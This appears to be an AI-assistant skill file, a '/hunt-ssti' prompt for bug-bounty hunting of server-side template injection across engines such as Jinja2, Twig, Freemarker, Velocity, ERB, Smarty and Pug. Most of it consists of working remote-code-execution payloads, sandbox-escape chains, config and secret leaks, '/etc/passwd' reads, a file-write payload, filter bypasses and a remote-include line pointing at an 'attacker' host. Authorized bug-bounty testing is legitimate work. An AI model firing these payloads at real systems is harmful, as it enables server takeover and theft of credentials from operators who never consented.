---
description: "SSTI hunting methodology. TRIGGER: user is testing for server-side template injection in Jinja2, Twig, Velocity, Freemarker, Handlebars, ERB, Smarty, Pug, or template-engine-driven RCE."
---

# /hunt-ssti - Server-Side Template Injection Hunting

You are assisting **Liodeus (YesWeHack)**, whose SSTI reports include Jinja2 RCE via `{{config}}` chain, Freemarker via `<#assign>` builtin, Velocity via `$class.inspect`, and Handlebars via prototype pollution. **SSTI is rare in 2026 but always critical when found** — every confirmed SSTI is RCE-class on the engine identified.

## Core Philosophy

SSTI lives wherever **user input becomes part of a server-rendered template**, not just data passed into one. The classic locations:
- Email subject/body templating ("Hello {{name}}, your order...")
- Notification systems
- PDF/report generation with named templates
- CMS / page-builder features
- Marketing automation tools
- Custom email signatures
- Webhook payload templating

The methodology is two-step: **detect first** (with engine-agnostic polyglot probes), **engine-identify second**, **escalate to RCE third**.

## SSTI Chains (from real reports)

### Chain 1: Jinja2 → RCE (Python/Flask)
Detection: `{{7*7}}` → `49`. Confirm engine: `{{7*'7'}}` → `7777777` (Jinja2/Twig) vs `49` (others).
Escalation:
```
{{config}}                                    # leaks app config (often DB creds, secret keys)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```
Sandbox-escape variants for hardened envs:
```
{{ ''.__class__.__mro__[1].__subclasses__()[N]('id', shell=True, stdout=-1).communicate() }}
```
Where `N` is the index of `subprocess.Popen` (varies by Python version).

### Chain 2: Twig → RCE (PHP/Symfony)
Detection: `{{7*7}}` → `49`, `{{7*'7'}}` → `49` (Twig multiplies numerically).
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|map('system')}}
```

### Chain 3: Freemarker → RCE (Java)
Detection: `${7*7}` → `49`, `<#assign x=7*7>${x}` → `49`.
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Chain 4: Velocity → RCE (Java)
Detection: `#set($x=7*7)$x` → `49`.
```
#set($e="exp")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### Chain 5: Handlebars → RCE (Node.js)
Detection: `{{7*7}}` → may be literal (Handlebars has no math by default). Use `{{#with}}` block:
```
{{#with "s" as |string|}}
  {{#with split as |conslist|}}
    {{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}
    ...
  {{/with}}
{{/with}}
```
Pre-built payloads available in PayloadsAllTheThings — use those.

### Chain 6: ERB → RCE (Ruby)
Detection: `<%= 7*7 %>` → `49`.
```
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
```

### Chain 7: Smarty → RCE (PHP)
Detection: `{$smarty.version}` → version string.
```
{php}echo `id`;{/php}                # only on older Smarty / unsandboxed
{system("id")}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php phpinfo(); ?>",self::clearConfig())}
```

### Chain 8: Pug / Jade → RCE (Node.js)
Detection: `#{7*7}` → `49`.
```
#{root.process.mainModule.require('child_process').execSync('id')}
```

## Discovery Methodology

### Step 1: Polyglot detection probes
Use a single payload that triggers detectable output across many engines:
```
${{<%[%'"}}%\.
```
Submit and see what error / output you get — different engines react differently. Or sequentially test each:
1. `{{7*7}}` — Jinja2, Twig, Liquid (some), Nunjucks, Handlebars-with-helper
2. `${7*7}` — Freemarker, Thymeleaf (`#{...}`), JSP EL
3. `<%= 7*7 %>` — ERB, EJS, JSP-classic
4. `#{7*7}` — Pug, Thymeleaf
5. `*{7*7}` — Thymeleaf
6. `[[${7*7}]]` — Thymeleaf (variable-expression)
7. `@{7*7}` — Thymeleaf (link-expression — usually doesn't eval)
8. `$verbatim/{7*7}` — Smarty
9. `#set($x=7*7)$x` — Velocity

If any of these produce `49` (or `7777777` for `7*'7'`), you've got SSTI.

### Step 2: Engine identification
Once you've got an arithmetic eval, narrow with engine-specific probes:
| Engine | Discriminator |
|---|---|
| Jinja2 | `{{7*'7'}}` → `7777777` |
| Twig | `{{7*'7'}}` → `49` |
| Freemarker | `${"freemarker.template.utility.Execute"?new()}` → object/no error |
| Velocity | `#set($x=1)$x.getClass()` → reflection works |
| Handlebars | `{{this}}` → context object |
| ERB | `<%= self.class %>` → Ruby class |
| Pug | `#{__filename}` → file path |
| Thymeleaf | `[[${T(java.lang.Runtime).getRuntime().exec('id')}]]` |

### Step 3: Where to plant probes
Every server-rendered templated context:
* Email-related: signup confirmation name, comment body that emails admin, ticket subject, notification config
* PDF / report features: invoice line items, report titles, custom field values
* Page-builder / CMS: any "custom HTML" or "custom variable" field
* Webhook payload templates
* "Customize your email" / "edit signature" features
* Templated URLs / templated filenames

### Step 4: Escalate within constraints
* If sandboxed (Jinja2 SandboxedEnvironment, Twig sandbox), use class-traversal payloads to escape
* If output is HTML-escaped, that doesn't matter — eval happens before escape
* Length limits: chain via `{% include %}` or `{% from %}` to load externally-hosted template
* Filter-based blocks: `{{}}` blocked? Try `{% %}` or alternate syntax

## Impact Demonstration

* Show arithmetic eval first (proof of SSTI without RCE)
* Then engine identification
* Then RCE proof: `id` / `whoami` / `hostname` output
* If sandboxed, document the sandbox AND show file read or env-var leak as fallback proof
* Show what you can read from the runtime: env vars (often DB creds, API keys), config object, source code

## Common Defenses & Bypasses

* **Sandbox**: Jinja2 SandboxedEnv blocks `__class__` access — bypass via `cycler.__init__.__globals__` or `lipsum.__globals__`
* **Output escape**: doesn't help; eval is server-side, escape is post-eval
* **Allowlist of variables**: if only specific vars work, look at *every* attribute on those vars (`request.environ`, `config['SECRET_KEY']`)
* **Length limit**: include external template (`{% include "http://attacker/t.html" %}` — varies by engine config)

## Key Considerations

* **Never confuse SSTI with XSS.** SSTI is server-side, evals on the server. `{{7*7}}` rendered as literal `49` in the HTML = SSTI. Rendered as `{{7*7}}` = no SSTI (even if browser eval'd it as JS — that's XSS).
* **CSP doesn't help against SSTI** — it's a server-side bug
* **Engine ≠ stack:** Jinja2 runs in Python apps, but Liquid (Shopify-style) runs in many languages. Verify the actual engine via probe responses.
* **SSTI in error pages / 500 responses** is also exploitable if the error template renders attacker-controlled data
* PayloadsAllTheThings has up-to-date, version-specific RCE payloads — use them; don't reinvent
* If you hit a sandbox you can't break, file-read or env-var leak is still a valid finding (often high)
* Always verify the engine before escalating — wrong engine wastes hours
